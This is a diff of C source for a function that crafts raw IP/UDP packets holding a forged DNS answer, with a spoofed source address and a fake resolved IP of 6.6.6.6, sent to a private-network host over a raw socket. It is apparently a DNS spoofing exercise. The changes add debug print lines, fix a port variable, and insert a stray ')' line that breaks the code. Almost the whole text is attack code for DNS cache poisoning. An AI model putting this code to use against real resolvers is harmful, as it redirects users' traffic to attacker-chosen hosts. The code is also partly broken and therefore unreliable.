@@ -69,7 +69,7 @@ unsigned short checksum(void *b, int len) {
 int full_spoofed_answer(uint txid, uint d_port) {
     char buffer[PACKET_SIZE];
     memset(buffer, 0, PACKET_SIZE);
-
+    
     // IP and UDP headers
     struct iphdr *iph = (struct iphdr *)buffer;
     struct udphdr *udph = (struct udphdr *)(buffer + sizeof(struct iphdr));
@@ -83,7 +83,7 @@ int full_spoofed_answer(uint txid, uint d_port) {
     char *resolved_ip = "6.6.6.6";
 
     dest.sin_family = AF_INET;
-    dest.sin_port = htons(port);                // Destination port
+    dest.sin_port = htons(d_port);                // Destination port
     dest.sin_addr.s_addr = inet_addr("192.168.1.203"); // Destination IP
 
     // Fill IP header
@@ -94,21 +94,20 @@ int full_spoofed_answer(uint txid, uint d_port) {
                          sizeof(struct dns_header) + strlen(domain) + 2 + sizeof(struct dns_question) +
                          sizeof(struct dns_rr));
     iph->id = htonl(54321);
-    printf("txid: %u\n", txid);
     iph->frag_off = 0;
     iph->ttl = 255;
     iph->protocol = IPPROTO_UDP;
     iph->saddr = inet_addr("192.168.1.207");
     iph->daddr = dest.sin_addr.s_addr;
     iph->check = 0;
-
+    printf("got here fill udp header \n");
     // Fill UDP header
     udph->source = htons(DNS_PORT);
     udph->dest = dest.sin_port;
     udph->len = htons(sizeof(struct udphdr) + sizeof(struct dns_header) +
                       strlen(domain) + 2 + sizeof(struct dns_question) + sizeof(struct dns_rr));
     udph->check = 0;
-
+    printf("got here fill dns header \n");
     // Fill DNS header
     dnsh->id = htons(12345);
     dnsh->flags = htons(0x8180); // Standard response
@@ -116,7 +115,7 @@ int full_spoofed_answer(uint txid, uint d_port) {
     dnsh->ans_count = htons(1); // One answer
     dnsh->auth_count = 0;
     dnsh->add_count = 0;
-
+    printf("got here add dns question \n");
     // Add DNS question section
     char *qname = (char *)(buffer + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dns_header));
     char *label = strtok(domain, ".");
@@ -128,11 +127,11 @@ int full_spoofed_answer(uint txid, uint d_port) {
         label = strtok(NULL, ".");
     }
     *qname++ = 0; // Null terminator for domain name
-
+)
     struct dns_question *qinfo = (struct dns_question *)qname;
     qinfo->qtype = htons(1);  // A record
     qinfo->qclass = htons(1); // IN class
-
+    printf("got here add dns answer \n");
     // Add DNS answer section
     struct dns_rr *ans = (struct dns_rr *)(qname + sizeof(struct dns_question));
     ans->name = htons(0xC00C); // Pointer to the question
@@ -141,10 +140,10 @@ int full_spoofed_answer(uint txid, uint d_port) {
     ans->ttl = htonl(300);     // TTL
     ans->data_len = htons(4);  // Length of IP address
     ans->rdata = inet_addr(resolved_ip);
-
+    printf("got here checksum \n");
     // Calculate IP checksum
     iph->check = checksum((unsigned short *)buffer, ntohs(iph->tot_len));
-
+    printf("got here create raw socket \n");
     // Create raw socket
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sock < 0) {
